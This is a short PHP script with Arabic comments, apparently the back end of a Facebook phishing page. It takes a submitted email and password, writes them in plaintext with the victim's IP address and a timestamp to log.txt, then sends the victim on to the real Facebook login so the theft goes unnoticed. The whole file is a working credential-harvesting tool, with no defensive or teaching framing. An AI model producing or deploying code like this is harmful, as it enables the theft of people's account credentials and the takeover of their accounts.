<?php
// تأكد من تسمية هذا الملف process.php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 1. استقبال البيانات
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR']; // تسجيل IP المستخدم للتوثيق
    $date = date("Y-m-d H:i:s");

    // 2. تنسيق البيانات لحفظها
    $data = "--- دخول جديد ---\n";
    $data .= "التاريخ: $date \n";
    $data .= "الإيميل: $email \n";
    $data .= "الباسورد: $pass \n";
    $data .= "IP: $ip \n";
    $data .= "-----------------\n\n";

    // 3. الحفظ في ملف نصي (سيتم إنشاؤه تلقائياً باسم log.txt)
    file_put_contents("log.txt", $data, FILE_APPEND);

    // 4. التوجيه الفوري لفيسبوك الحقيقي
    header("Location: https://www.facebook.com/login");
    exit();
}
?>
